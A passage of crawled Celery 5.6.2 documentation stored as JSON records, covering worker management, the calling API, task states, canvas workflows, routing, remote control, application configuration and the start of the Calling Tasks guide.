tasks to finish before it can be processed.\n\nThe default concurrency number is the number of CPU’s on that machine (including cores). You can specify a custom number using the celery worker -c option. There’s no recommended value, as the optimal number depends on a number of factors, but if your tasks are mostly I/O-bound then you can try to increase it. Experimentation has shown that adding more than twice the number of CPU’s is rarely effective, and likely to degrade performance instead.\n\nIncluding the default prefork pool, Celery also supports using Eventlet, Gevent, and running in a single thread (see Concurrency).\n\n– Events is an option that causes Celery to send monitoring messages (events) for actions occurring in the worker. These can be used by monitor programs like celery events, and Flower – the real-time Celery monitor, which you can read about in the Monitoring and Management guide.\n\n– Queues is the list of queues that the worker will consume tasks from. The worker can be told to consume from several queues at once, and this is used to route messages to specific workers as a means for Quality of Service, separation of concerns, and prioritization, all described in the Routing Guide.\n\nYou can get a complete list of command-line arguments by passing in the --help flag:\n\n$ celery worker --help\n\n\nThese options are described in more detailed in the Workers Guide.\n\nStopping the worker\n\nTo stop the worker simply hit Control-c. A list of signals supported by the worker is detailed in the Workers Guide.\n\nIn the background\n\nIn production you’ll want to run the worker in the background, described in detail in the daemonization tutorial.\n\nThe daemonization scripts uses the celery multi command to start one or more workers in the background:\n\n$ celery multi start w1 -A proj -l INFO\ncelery multi v4.0.0 (latentcall)\n> Starting nodes...\n    > w1.halcyon.local: OK\n\n\nYou can restart it too:\n\n$ celery  multi restart w1 -A proj -l INFO\ncelery multi v4.0.0 (latentcall)\n> Stopping nodes...\n    > w1.halcyon.local: TERM -> 64024\n> Waiting for 1 node.....\n    > w1.halcyon.local: OK\n> Restarting node w1.halcyon.local: OK\ncelery multi v4.0.0 (latentcall)\n> Stopping nodes...\n    > w1.halcyon.local: TERM -> 64052\n\n\nor stop it:\n\n$ celery multi stop w1 -A proj -l INFO\n\n\nThe stop command is asynchronous so it won’t wait for the worker to shutdown. You’ll probably want to use the stopwait command instead, which ensures that all currently executing tasks are completed before exiting:\n\n$ celery multi stopwait w1 -A proj -l INFO\n\n\nNote\n\ncelery multi doesn’t store information about workers so you need to use the same command-line arguments when restarting. Only the same pidfile and logfile arguments must be used when stopping.\n\nBy default it’ll create pid and log files in the current directory. To protect against multiple workers launching on top of each other you’re encouraged to put these in a dedicated directory:\n\n$ mkdir -p /var/run/celery\n$ mkdir -p /var/log/celery\n$ celery multi start w1 -A proj -l INFO --pidfile=/var/run/celery/%n.pid \\\n                                        --logfile=/var/log/celery/%n%I.log\n\n\nWith the multi command you can start multiple workers, and there’s a powerful command-line syntax to specify arguments for different workers too, for example:\n\n$ celery multi start 10 -A proj -l INFO -Q:1-3 images,video -Q:4,5 data \\\n    -Q default -L:4,5 debug\n\n\nFor more examples see the multi module in the API reference.\n\nAbout the --app argument\n\nThe --app argument specifies the Celery app instance to use, in the form of module.path:attribute\n\nBut it also supports a shortcut form. If only a package name is specified, it’ll try to search for the app instance, in the following order:\n\nWith --app=proj:\n\nan attribute named proj.app, or\n\nan attribute named proj.celery, or\n\nany attribute in the module proj where the value is a Celery application, or\n\nIf none of these are found it’ll try a submodule named proj.celery:\n\nan attribute named proj.celery.app, or\n\nan attribute named proj.celery.celery, or\n\nAny attribute in the module proj.celery where the value is a Celery application.\n\nThis scheme mimics the practices used in the documentation – that is, proj:app for a single contained module, and proj.celery:app for larger projects.\n\nCalling Tasks\n\nYou can call a task using the delay() method:\n\n>>> from proj.tasks import add\n\n>>> add.delay(2, 2)\n\n\nThis method is actually a star-argument shortcut to another method called apply_async():\n\n>>> add.apply_async((2, 2))\n\n\nThe latter enables you to specify execution options like the time to run (countdown), the queue it should be sent to, and so on:\n\n>>> add.apply_async((2, 2), queue='lopri', countdown=10)\n\n\nIn the above example the task will be sent to a queue named lopri and the task will execute, at the earliest, 10 seconds after the message was sent.\n\nApplying the task directly will execute the task in the current process, so that no message is sent:\n\n>>> add(2, 2)\n4\n\n\nThese three methods - delay(), apply_async(), and applying (__call__), make up the Celery calling API, which is also used for signatures.\n\nA more detailed overview of the Calling API can be found in the Calling User Guide.\n\nEvery task invocation will be given a unique identifier (an UUID) – this is the task id.\n\nThe delay and apply_async methods return an AsyncResult instance, which can be used to keep track of the tasks execution state. But for this you need to enable a result backend so that the state can be stored somewhere.\n\nResults are disabled by default because there is no result backend that suits every application; to choose one you need to consider the drawbacks of each individual backend. For many tasks keeping the return value isn’t even very useful, so it’s a sensible default to have. Also note that result backends aren’t used for monitoring tasks and workers: for that Celery uses dedicated event messages (see Monitoring and Management Guide).\n\nIf you have a result backend configured you can retrieve the return value of a task:\n\n>>> res = add.delay(2, 2)\n>>> res.get(timeout=1)\n4\n\n\nYou can find the task’s id by looking at the id attribute:\n\n>>> res.id\nd6b3aea2-fb9b-4ebc-8da4-848818db9114\n\n\nYou can also inspect the exception and traceback if the task raised an exception, in fact result.get() will propagate any errors by default:\n\n>>> res = add.delay(2, '2')\n>>> res.get(timeout=1)\n\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"celery/result.py\", line 221, in get\n    return self.backend.wait_for_pending(\n  File \"celery/backends/asynchronous.py\", line 195, in wait_for_pending\n    return result.maybe_throw(callback=callback, propagate=propagate)\n  File \"celery/result.py\", line 333, in maybe_throw\n    self.throw(value, self._to_remote_traceback(tb))\n  File \"celery/result.py\", line 326, in throw\n    self.on_ready.throw(*args, **kwargs)\n  File \"vine/promises.py\", line 244, in throw\n    reraise(type(exc), exc, tb)\n  File \"vine/five.py\", line 195, in reraise\n    raise value\nTypeError: unsupported operand type(s) for +: 'int' and 'str'\n\n\nIf you don’t wish for the errors to propagate, you can disable that by passing propagate:\n\n>>> res.get(propagate=False)\nTypeError(\"unsupported operand type(s) for +: 'int' and 'str'\")\n\n\nIn this case it’ll return the exception instance raised instead – so to check whether the task succeeded or failed, you’ll have to use the corresponding methods on the result instance:\n\n>>> res.failed()\nTrue\n\n>>> res.successful()\nFalse\n\n\nSo how does it know if the task has failed or not? It can find out by looking at the tasks state:\n\n>>> res.state\n'FAILURE'\n\n\nA task can only be in a single state, but it can progress through several states. The stages of a typical task can be:\n\nPENDING -> STARTED -> SUCCESS\n\n\nThe started state is a special state that’s only recorded if the task_track_started setting is enabled, or if the @task(track_started=True) option is set for the task.\n\nThe pending state is actually not a recorded state, but rather the default state for any task id that’s unknown: this you can see from this example:\n\n>>> from proj.celery import app\n\n>>> res = app.AsyncResult('this-id-does-not-exist')\n>>> res.state\n'PENDING'\n\n\nIf the task is retried the stages can become even more complex. To demonstrate, for a task that’s retried two times the stages would be:\n\nPENDING -> STARTED -> RETRY -> STARTED -> RETRY -> STARTED -> SUCCESS\n\n\nTo read more about task states you should see the States section in the tasks user guide.\n\nCalling tasks is described in detail in the Calling Guide.\n\nCanvas: Designing Work-flows\n\nYou just learned how to call a task using the tasks delay method, and this is often all you need. But sometimes you may want to pass the signature of a task invocation to another process or as an argument to another function, for which Celery uses something called signatures.\n\nA signature wraps the arguments and execution options of a single task invocation in such a way that it can be passed to functions or even serialized and sent across the wire.\n\nYou can create a signature for the add task using the arguments (2, 2), and a countdown of 10 seconds like this:\n\n>>> add.signature((2, 2), countdown=10)\ntasks.add(2, 2)\n\n\nThere’s also a shortcut using star arguments:\n\n>>> add.s(2, 2)\ntasks.add(2, 2)\n\nAnd there’s that calling API again…\n\nSignature instances also support the calling API, meaning they have delay and apply_async methods.\n\nBut there’s a difference in that the signature may already have an argument signature specified. The add task takes two arguments, so a signature specifying two arguments would make a complete signature:\n\n>>> s1 = add.s(2, 2)\n>>> res = s1.delay()\n>>> res.get()\n4\n\n\nBut, you can also make incomplete signatures to create what we call partials:\n\n# incomplete partial: add(?, 2)\n>>> s2 = add.s(2)\n\n\ns2 is now a partial signature that needs another argument to be complete, and this can be resolved when calling the signature:\n\n# resolves the partial: add(8, 2)\n>>> res = s2.delay(8)\n>>> res.get()\n10\n\n\nHere you added the argument 8 that was prepended to the existing argument 2 forming a complete signature of add(8, 2).\n\nKeyword arguments can also be added later; these are then merged with any existing keyword arguments, but with new arguments taking precedence:\n\n>>> s3 = add.s(2, 2, debug=True)\n>>> s3.delay(debug=False)   # debug is now False.\n\n\nAs stated, signatures support the calling API: meaning that\n\nsig.apply_async(args=(), kwargs={}, **options)\n\nCalls the signature with optional partial arguments and partial keyword arguments. Also supports partial execution options.\n\nsig.delay(*args, **kwargs)\n\nStar argument version of apply_async. Any arguments will be prepended to the arguments in the signature, and keyword arguments is merged with any existing keys.\n\nSo this all seems very useful, but what can you actually do with these? To get to that I must introduce the canvas primitives…\n\nThe Primitives\n\ngroup\n\nchain\n\nchord\n\n\t\n\nmap\n\nstarmap\n\nchunks\n\nThese primitives are signature objects themselves, so they can be combined in any number of ways to compose complex work-flows.\n\nNote\n\nThese examples retrieve results, so to try them out you need to configure a result backend. The example project above already does that (see the backend argument to Celery).\n\nLet’s look at some examples:\n\nGroups\n\nA group calls a list of tasks in parallel, and it returns a special result instance that lets you inspect the results as a group, and retrieve the return values in order.\n\n>>> from celery import group\n>>> from proj.tasks import add\n\n>>> group(add.s(i, i) for i in range(10))().get()\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n\n\nPartial group\n\n>>> g = group(add.s(i) for i in range(10))\n>>> g(10).get()\n[10, 11, 12, 13, 14, 15, 16, 17, 18, 19]\n\nChains\n\nTasks can be linked together so that after one task returns the other is called:\n\n>>> from celery import chain\n>>> from proj.tasks import add, mul\n\n# (4 + 4) * 8\n>>> chain(add.s(4, 4) | mul.s(8))().get()\n64\n\n\nor a partial chain:\n\n>>> # (? + 4) * 8\n>>> g = chain(add.s(4) | mul.s(8))\n>>> g(4).get()\n64\n\n\nChains can also be written like this:\n\n>>> (add.s(4, 4) | mul.s(8))().get()\n64\n\nChords\n\nA chord is a group with a callback:\n\n>>> from celery import chord\n>>> from proj.tasks import add, xsum\n\n>>> chord((add.s(i, i) for i in range(10)), xsum.s())().get()\n90\n\n\nA group chained to another task will be automatically converted to a chord:\n\n>>> (group(add.s(i, i) for i in range(10)) | xsum.s())().get()\n90\n\n\nSince these primitives are all of the signature type they can be combined almost however you want, for example:\n\n>>> upload_document.s(file) | group(apply_filter.s() for filter in filters)\n\n\nBe sure to read more about work-flows in the Canvas user guide.\n\nRouting\n\nCelery supports all of the routing facilities provided by AMQP, but it also supports simple routing where messages are sent to named queues.\n\nThe task_routes setting enables you to route tasks by name and keep everything centralized in one location:\n\napp.conf.update(\n    task_routes = {\n        'proj.tasks.add': {'queue': 'hipri'},\n    },\n)\n\n\nYou can also specify the queue at runtime with the queue argument to apply_async:\n\n>>> from proj.tasks import add\n>>> add.apply_async((2, 2), queue='hipri')\n\n\nYou can then make a worker consume from this queue by specifying the celery worker -Q option:\n\n$ celery -A proj worker -Q hipri\n\n\nYou may specify multiple queues by using a comma-separated list. For example, you can make the worker consume from both the default queue and the hipri queue, where the default queue is named celery for historical reasons:\n\n$ celery -A proj worker -Q hipri,celery\n\n\nThe order of the queues doesn’t matter as the worker will give equal weight to the queues.\n\nTo learn more about routing, including taking use of the full power of AMQP routing, see the Routing Guide.\n\nRemote Control\n\nIf you’re using RabbitMQ (AMQP), Redis, or Qpid as the broker then you can control and inspect the worker at runtime.\n\nFor example you can see what tasks the worker is currently working on:\n\n$ celery -A proj inspect active\n\n\nThis is implemented by using broadcast messaging, so all remote control commands are received by every worker in the cluster.\n\nYou can also specify one or more workers to act on the request using the --destination option. This is a comma-separated list of worker host names:\n\n$ celery -A proj inspect active --destination=celery@example.com\n\n\nIf a destination isn’t provided then every worker will act and reply to the request.\n\nThe celery inspect command contains commands that don’t change anything in the worker; it only returns information and statistics about what’s going on inside the worker. For a list of inspect commands you can execute:\n\n$ celery -A proj inspect --help\n\n\nThen there’s the celery control command, which contains commands that actually change things in the worker at runtime:\n\n$ celery -A proj control --help\n\n\nFor example you can force workers to enable event messages (used for monitoring tasks and workers):\n\n$ celery -A proj control enable_events\n\n\nWhen events are enabled you can then start the event dumper to see what the workers are doing:\n\n$ celery -A proj events --dump\n\n\nor you can start the curses interface:\n\n$ celery -A proj events\n\n\nwhen you’re finished monitoring you can disable events again:\n\n$ celery -A proj control disable_events\n\n\nThe celery status command also uses remote control commands and shows a list of online workers in the cluster:\n\n$ celery -A proj status\n\n\nYou can read more about the celery command and monitoring in the Monitoring Guide.\n\nTimezone\n\nAll times and dates, internally and in messages use the UTC timezone.\n\nWhen the worker receives a message, for example with a countdown set it converts that UTC time to local time. If you wish to use a different timezone than the system timezone then you must configure that using the timezone setting:\n\napp.conf.timezone = 'Europe/London'\n\nOptimization\n\nThe default configuration isn’t optimized for throughput. By default, it tries to walk the middle way between many short tasks and fewer long tasks, a compromise between throughput and fair scheduling.\n\nIf you have strict fair scheduling requirements, or want to optimize for throughput then you should read the Optimizing Guide.\n\nWhat to do now?\n\nNow that you have read this document you should continue to the User Guide.\n\nThere’s also an API reference if you’re so inclined.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nFirst Steps with Celery\n\nNext topic\n\nResources\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Next Steps\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491565,
    "timestamp": "2026-02-23T00:13:49.273Z",
    "title": "Resources — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/getting-started/resources.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Resources\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nResources\n\nGetting Help\n\nSocial Media\n\nBug tracker\n\nContributing\n\nLicense\n\nGetting Help\n\nWarning\n\nOur Google Groups account has been compromised.\n\nSocial Media\n\nFollow us on social media:\n\nX\n\nLinkedIn\n\nThese accounts will (mostly) mirror each other, but we encourage you to follow us on all platforms to ensure you don’t miss any important updates.\n\nBug tracker\n\nIf you have any suggestions, bug reports, or annoyances please report them to our issue tracker at https://github.com/celery/celery/issues/\n\nContributing\n\nDevelopment of celery happens at GitHub: https://github.com/celery/celery\n\nYou’re highly encouraged to participate in the development of celery. If you don’t like GitHub (for some reason) you’re welcome to send regular patches.\n\nBe sure to also read the Contributing to Celery section in the documentation.\n\nLicense\n\nThis software is licensed under the New BSD License. See the LICENSE file in the top distribution directory for the full license text.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nNext Steps\n\nNext topic\n\nUser Guide\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Resources\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491566,
    "timestamp": "2026-02-23T00:13:49.273Z",
    "title": "User Guide — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nUser Guide\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nApplication\nTasks\nCalling Tasks\nCanvas: Designing Work-flows\nWorkers Guide\nDaemonization\nPeriodic Tasks\nRouting Tasks\nMonitoring and Management Guide\nSecurity\nOptimizing\nDebugging\nConcurrency\nSignals\nTesting with Celery\nExtensions and Bootsteps\nConfiguration and defaults\nDocumenting Tasks with Sphinx\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nResources\n\nNext topic\n\nApplication\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491567,
    "timestamp": "2026-02-23T00:13:49.274Z",
    "title": "Application — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/application.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Application\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nApplication\n\nMain Name\n\nConfiguration\n\nLaziness\n\nBreaking the chain\n\nAbstract Tasks\n\nThe Celery library must be instantiated before use, this instance is called an application (or app for short).\n\nThe application is thread-safe so that multiple Celery applications with different configurations, components, and tasks can co-exist in the same process space.\n\nLet’s create one now:\n\n>>> from celery import Celery\n>>> app = Celery()\n>>> app\n<Celery __main__:0x100469fd0>\n\n\nThe last line shows the textual representation of the application: including the name of the app class (Celery), the name of the current main module (__main__), and the memory address of the object (0x100469fd0).\n\nMain Name\n\nOnly one of these is important, and that’s the main module name. Let’s look at why that is.\n\nWhen you send a task message in Celery, that message won’t contain any source code, but only the name of the task you want to execute. This works similarly to how host names work on the internet: every worker maintains a mapping of task names to their actual functions, called the task registry.\n\nWhenever you define a task, that task will also be added to the local registry:\n\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n>>> add\n<@task: __main__.add>\n\n>>> add.name\n__main__.add\n\n>>> app.tasks['__main__.add']\n<@task: __main__.add>\n\n\nand there you see that __main__ again; whenever Celery isn’t able to detect what module the function belongs to, it uses the main module name to generate the beginning of the task name.\n\nThis is only a problem in a limited set of use cases:\n\nIf the module that the task is defined in is run as a program.\n\nIf the application is created in the Python shell (REPL).\n\nFor example here, where the tasks module is also used to start a worker with app.worker_main():\n\ntasks.py:\n\nfrom celery import Celery\napp = Celery()\n\n@app.task\ndef add(x, y): return x + y\n\nif __name__ == '__main__':\n    args = ['worker', '--loglevel=INFO']\n    app.worker_main(argv=args)\n\n\nWhen this module is executed the tasks will be named starting with “__main__”, but when the module is imported by another process, say to call a task, the tasks will be named starting with “tasks” (the real name of the module):\n\n>>> from tasks import add\n>>> add.name\ntasks.add\n\n\nYou can specify another name for the main module:\n\n>>> app = Celery('tasks')\n>>> app.main\n'tasks'\n\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n>>> add.name\ntasks.add\n\n\nSee also\n\nNames\n\nConfiguration\n\nThere are several options you can set that’ll change how Celery works. These options can be set directly on the app instance, or you can use a dedicated configuration module.\n\nThe configuration is available as app.conf:\n\n>>> app.conf.timezone\n'Europe/London'\n\n\nwhere you can also set configuration values directly:\n\n>>> app.conf.enable_utc = True\n\n\nor update several keys at once by using the update method:\n\n>>> app.conf.update(\n...     enable_utc=True,\n...     timezone='Europe/London',\n...)\n\n\nThe configuration object consists of multiple dictionaries that are consulted in order:\n\nChanges made at run-time.\n\nThe configuration module (if any)\n\nThe default configuration (celery.app.defaults).\n\nYou can even add new default sources by using the app.add_defaults() method.\n\nSee also\n\nGo to the Configuration reference for a complete listing of all the available settings, and their default values.\n\nconfig_from_object\n\nThe app.config_from_object() method loads configuration from a configuration object.\n\nThis can be a configuration module, or any object with configuration attributes.\n\nNote that any configuration that was previously set will be reset when config_from_object() is called. If you want to set additional configuration you should do so after.\n\nExample 1: Using the name of a module\n\nThe app.config_from_object() method can take the fully qualified name of a Python module, or even the name of a Python attribute, for example: \"celeryconfig\", \"myproj.config.celery\", or \"myproj.config:CeleryConfig\":\n\nfrom celery import Celery\n\napp = Celery()\napp.config_from_object('celeryconfig')\n\n\nThe celeryconfig module may then look like this:\n\nceleryconfig.py:\n\nenable_utc = True\ntimezone = 'Europe/London'\n\n\nand the app will be able to use it as long as import celeryconfig is possible.\n\nExample 2: Passing an actual module object\n\nYou can also pass an already imported module object, but this isn’t always recommended.\n\nTip\n\nUsing the name of a module is recommended as this means the module does not need to be serialized when the prefork pool is used. If you’re experiencing configuration problems or pickle errors then please try using the name of a module instead.\n\nimport celeryconfig\n\nfrom celery import Celery\n\napp = Celery()\napp.config_from_object(celeryconfig)\n\nExample 3: Using a configuration class/object\nfrom celery import Celery\n\napp = Celery()\n\nclass Config:\n    enable_utc = True\n    timezone = 'Europe/London'\n\napp.config_from_object(Config)\n# or using the fully qualified name of the object:\n#   app.config_from_object('module:Config')\n\nconfig_from_envvar\n\nThe app.config_from_envvar() takes the configuration module name from an environment variable\n\nFor example – to load configuration from a module specified in the environment variable named CELERY_CONFIG_MODULE:\n\nimport os\nfrom celery import Celery\n\n#: Set default configuration module name\nos.environ.setdefault('CELERY_CONFIG_MODULE', 'celeryconfig')\n\napp = Celery()\napp.config_from_envvar('CELERY_CONFIG_MODULE')\n\n\nYou can then specify the configuration module to use via the environment:\n\n$ CELERY_CONFIG_MODULE=\"celeryconfig.prod\" celery worker -l INFO\n\nCensored configuration\n\nIf you ever want to print out the configuration, as debugging information or similar, you may also want to filter out sensitive information like passwords and API keys.\n\nCelery comes with several utilities useful for presenting the configuration, one is humanize():\n\n>>> app.conf.humanize(with_defaults=False, censored=True)\n\n\nThis method returns the configuration as a tabulated string. This will only contain changes to the configuration by default, but you can include the built-in default keys and values by enabling the with_defaults argument.\n\nIf you instead want to work with the configuration as a dictionary, you can use the table() method:\n\n>>> app.conf.table(with_defaults=False, censored=True)\n\n\nPlease note that Celery won’t be able to remove all sensitive information, as it merely uses a regular expression to search for commonly named keys. If you add custom settings containing sensitive information you should name the keys using a name that Celery identifies as secret.\n\nA configuration setting will be censored if the name contains any of these sub-strings:\n\nAPI, TOKEN, KEY, SECRET, PASS, SIGNATURE, DATABASE\n\nLaziness\n\nThe application instance is lazy, meaning it won’t be evaluated until it’s actually needed.\n\nCreating a Celery instance will only do the following:\n\nCreate a logical clock instance, used for events.\n\nCreate the task registry.\n\nSet itself as the current app (but not if the set_as_current argument was disabled)\n\nCall the app.on_init() callback (does nothing by default).\n\nThe app.task() decorators don’t create the tasks at the point when the task is defined, instead it’ll defer the creation of the task to happen either when the task is used, or after the application has been finalized,\n\nThis example shows how the task isn’t created until you use the task, or access an attribute (in this case repr()):\n\n>>> @app.task\n>>> def add(x, y):\n...    return x + y\n\n>>> type(add)\n<class 'celery.local.PromiseProxy'>\n\n>>> add.__evaluated__()\nFalse\n\n>>> add        # <-- causes repr(add) to happen\n<@task: __main__.add>\n\n>>> add.__evaluated__()\nTrue\n\n\nFinalization of the app happens either explicitly by calling app.finalize() – or implicitly by accessing the app.tasks attribute.\n\nFinalizing the object will:\n\nCopy tasks that must be shared between apps\n\nTasks are shared by default, but if the shared argument to the task decorator is disabled, then the task will be private to the app it’s bound to.\n\nEvaluate all pending task decorators.\n\nMake sure all tasks are bound to the current app.\n\nTasks are bound to an app so that they can read default values from the configuration.\n\nThe “default app”\n\nCelery didn’t always have applications, it used to be that there was only a module-based API. A compatibility API was available at the old location until the release of Celery 5.0, but has been removed.\n\nCelery always creates a special app - the “default app”, and this is used if no custom application has been instantiated.\n\nThe celery.task module is no longer available. Use the methods on the app instance, not the module based API:\n\nfrom celery.task import Task   # << OLD Task base class.\n\nfrom celery import Task        # << NEW base class.\n\nBreaking the chain\n\nWhile it’s possible to depend on the current app being set, the best practice is to always pass the app instance around to anything that needs it.\n\nI call this the “app chain”, since it creates a chain of instances depending on the app being passed.\n\nThe following example is considered bad practice:\n\nfrom celery import current_app\n\nclass Scheduler:\n\n    def run(self):\n        app = current_app\n\n\nInstead it should take the app as an argument:\n\nclass Scheduler:\n\n    def __init__(self, app):\n        self.app = app\n\n\nInternally Celery uses the celery.app.app_or_default() function so that everything also works in the module-based compatibility API\n\nfrom celery.app import app_or_default\n\nclass Scheduler:\n    def __init__(self, app=None):\n        self.app = app_or_default(app)\n\n\nIn development you can set the CELERY_TRACE_APP environment variable to raise an exception if the app chain breaks:\n\n$ CELERY_TRACE_APP=1 celery worker -l INFO\n\n\nEvolving the API\n\nCelery has changed a lot from 2009 since it was initially created.\n\nFor example, in the beginning it was possible to use any callable as a task:\n\ndef hello(to):\n    return 'hello {0}'.format(to)\n\n>>> from celery.execute import apply_async\n\n>>> apply_async(hello, ('world!',))\n\n\nor you could also create a Task class to set certain options, or override other behavior\n\nfrom celery import Task\nfrom celery.registry import tasks\n\nclass Hello(Task):\n    queue = 'hipri'\n\n    def run(self, to):\n        return 'hello {0}'.format(to)\ntasks.register(Hello)\n\n>>> Hello.delay('world!')\n\n\nLater, it was decided that passing arbitrary call-able’s was an anti-pattern, since it makes it very hard to use serializers other than pickle, and the feature was removed in 2.0, replaced by task decorators:\n\nfrom celery import app\n\n@app.task(queue='hipri')\ndef hello(to):\n    return 'hello {0}'.format(to)\n\nAbstract Tasks\n\nAll tasks created using the app.task() decorator will inherit from the application’s base Task class.\n\nYou can specify a different base class using the base argument:\n\n@app.task(base=OtherTask):\ndef add(x, y):\n    return x + y\n\n\nTo create a custom task class you should inherit from the neutral base class: celery.Task.\n\nfrom celery import Task\n\nclass DebugTask(Task):\n\n    def __call__(self, *args, **kwargs):\n        print('TASK STARTING: {0.name}[{0.request.id}]'.format(self))\n        return self.run(*args, **kwargs)\n\n\nTip\n\nIf you override the task’s __call__ method, then it’s very important that you also call self.run to execute the body of the task. Do not call super().__call__. The __call__ method of the neutral base class celery.Task is only present for reference. For optimization, this has been unrolled into celery.app.trace.build_tracer.trace_task which calls run directly on the custom task class if no __call__ method is defined.\n\nThe neutral base class is special because it’s not bound to any specific app yet. Once a task is bound to an app it’ll read configuration to set default values, and so on.\n\nTo realize a base class you need to create a task using the app.task() decorator:\n\n@app.task(base=DebugTask)\ndef add(x, y):\n    return x + y\n\n\nIt’s even possible to change the default base class for an application by changing its app.Task() attribute:\n\n>>> from celery import Celery, Task\n\n>>> app = Celery()\n\n>>> class MyBaseTask(Task):\n...    queue = 'hipri'\n\n>>> app.Task = MyBaseTask\n>>> app.Task\n<unbound MyBaseTask>\n\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n>>> add\n<@task: __main__.add>\n\n>>> add.__class__.mro()\n[<class add of <Celery __main__:0x1012b4410>>,\n <unbound MyBaseTask>,\n <unbound Task>,\n <type 'object'>]\n\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nUser Guide\n\nNext topic\n\nTasks\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Application\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491569,
    "timestamp": "2026-02-23T00:13:49.288Z",
    "title": "Calling Tasks — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/calling.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Calling Tasks\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nCalling Tasks\n\nBasics\n\nLinking (callbacks/errbacks)\n\nOn message\n\nETA and Countdown\n\nExpiration\n\nMessage Sending Retry\n\nConnection Error Handling\n\nSerializers\n\nCompression\n\nConnections\n\nRouting options\n\nResults options\n\nBasics\n\nThis document describes Celery’s uniform “Calling API” used by task instances and the canvas.\n\nThe API defines a standard set of execution options, as well as three methods:\n\napply_async(args[, kwargs[, …]])\n\nSends a task message.\n\ndelay(*args, **kwargs)\n\nShortcut to send a task message, but doesn’t support execution options.\n\ncalling (__call__)\n\nApplying an object supporting the calling API (e.g., add(2, 2)) means that the task will not be executed by a worker, but in the current process instead (a message won’t be sent).\n\nQuick Cheat Sheet\n\nT.delay(arg, kwarg=value)\n\nStar arguments shortcut to .apply_async. (.delay(*args, **kwargs) calls .apply_async(args, kwargs)).\n\nT.apply_async((arg,), {'kwarg': value})\n\nT.apply_async(countdown=10)\n\nexecutes in 10 seconds from now.\n\nT.apply_async(eta=now + timedelta(seconds=10))\n\nexecutes in 10 seconds from now, specified using eta\n\nT.apply_async(countdown=60, expires=120)\n\nexecutes in one minute from now, but expires after 2 minutes.\n\nT.apply_async(expires=now + timedelta(days=2))\n\nexpires in 2 days, set using datetime.\n\nT.apply_async(task_id=f'my_own_task_id')\n\nsets the id of the task to my_own_task_id instead of a uuid that is normally generated\n\nExample\n\nThe delay() method is convenient as it looks like calling a regular function:\n\ntask.delay(arg1, arg2, kwarg1='x', kwarg2='y')\n\n\nUsing apply_async() instead you have to write:\n\ntask.apply_async(args=[arg1, arg2], kwargs={'kwarg1': 'x', 'kwarg2': 'y'})\n\n\nTip\n\nIf the task isn’t registered in the current process you can use send_task() to call the task by name instead.\n\nSo delay is clearly convenient, but if you want to set additional execution options you have to use apply_async.\n\nThe rest of this document will go into the task execution options in detail. All examples use a task called add, returning the sum of two arguments:\n\n@app.task\ndef add(x, y):\n    return x + y\n\n\nThere’s another way…\n\nYou’ll learn more about this later while reading about the Canvas, but signature’s are objects used to pass around the signature of a task invocation, (for example to send it over the network), and they also support the Calling API:\n\ntask.s(arg1, arg2, kwarg1='x', kwargs2='y').apply_async()\n\nLinking (callbacks/errbacks)\n\nCelery supports linking tasks together so that one task follows another. The callback task will be applied with the result of the parent task as a partial argument:\n\nadd.apply_async((2, 2), link=add.s(16))\n\n\nWhat’s s?\n\nThe add.s call used here is called a signature. If you don’t know what they are you should read about them in the canvas guide. There you can also learn about chain: a simpler way to chain tasks together.\n\nIn practice the link execution option is considered an internal primitive, and you’ll probably not use it directly, but use chains instead.\n\nHere the result of the first task (4) will be sent to a new task that adds 16 to the previous result, forming the expression \n\nYou can also cause a callback to be applied if task raises an exception (errback). The worker won’t actually call the errback as a task, but will instead call the errback function directly so that the raw request, exception and traceback objects can be passed to it.\n\nThis is an example error callback:\n\n@app.task\ndef error_handler(request, exc, traceback):\n    print('Task {0} raised exception: {1!r}\\n{2!r}'.format(\n          request.id, exc, traceback))\n\n\nit can be added to the task using the link_error execution option:\n\nadd.apply_async((2, 2), link_error=error_handler.s())\n\n\nIn addition, both the link and link_error options can be expressed as a list:\n\nadd.apply_async((2, 2), link=[add.s(16), other_task.s()])\n\n\nThe callbacks/errbacks will then be called in order, and all callbacks will be called with the return value of the parent task as a partial argument.\n\nIn the case of a chord, we can handle errors using multiple handling strategies. See chord error handling for more information.\n\nOn message\n\nCelery supports catching all states changes by setting on_message callback.\n\nFor example for long-running tasks to send task progress you can do something like 